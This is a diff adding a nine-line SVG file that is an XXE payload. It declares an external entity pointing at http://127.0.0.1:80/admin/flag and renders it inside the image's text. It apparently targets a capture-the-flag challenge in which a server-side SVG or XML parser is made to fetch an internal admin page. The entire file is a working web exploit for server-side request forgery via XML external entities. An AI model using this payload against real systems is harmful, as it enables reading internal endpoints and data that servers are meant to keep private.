@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY FLAG SYSTEM "http://127.0.0.1:80/admin/flag">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
+  <text x="10" y="50" font-family="monospace" font-size="16">
+    &FLAG;
+  </text>
+</svg>
